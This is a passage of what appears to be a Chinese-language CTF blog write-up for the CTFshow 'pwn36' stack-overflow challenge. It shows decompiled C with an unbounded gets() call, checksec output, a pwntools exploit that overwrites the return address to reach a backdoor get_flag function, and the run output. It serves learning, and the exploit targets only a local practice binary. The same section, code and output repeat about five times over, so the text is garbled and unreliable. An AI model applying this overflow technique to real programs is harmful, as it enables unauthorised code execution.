<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-8"><a href="#pwn36-8" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-9"><a href="#pwn36-9" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-10"><a href="#pwn36-10" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-11"><a href="#pwn36-11" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-12"><a href="#pwn36-12" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
